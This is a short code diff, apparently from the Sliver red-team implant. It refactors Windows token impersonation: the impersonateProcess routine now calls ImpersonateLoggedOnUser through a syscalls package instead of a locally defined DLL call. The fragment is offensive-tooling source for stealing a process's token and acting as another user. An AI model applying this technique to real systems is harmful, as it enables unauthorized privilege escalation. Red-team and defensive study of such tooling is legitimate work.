@@ -37,22 +37,13 @@ import (
 
 	"github.com/bishopfox/sliver/sliver/ps"
 	"github.com/bishopfox/sliver/sliver/taskrunner"
+	"github.com/bishopfox/sliver/sliver/syscalls"
 )
 
 const (
 
 	THREAD_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff
 )
-
-func impersonateLoggedOnUser(hToken windows.Token) (err error) {
-	modadvapi32 := windows.MustLoadDLL("advapi32.dll")
-	procImpersonateLoggedOnUser := modadvapi32.MustFindProc("ImpersonateLoggedOnUser")
-	r1, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
-	if r1 != 0 {
-		return nil
-	}
-	return
-}
 
 func SePrivEnable(s string) error {
 	var tokenHandle windows.Token
@@ -156,7 +147,7 @@ func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
 	}
 	defer primaryToken.Close()
 
-	err = impersonateLoggedOnUser(*primaryToken)
+	err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
 	if err != nil {
 		// {{if .Debug}}
 		log.Println("impersonateLoggedOnUser failed:", err)
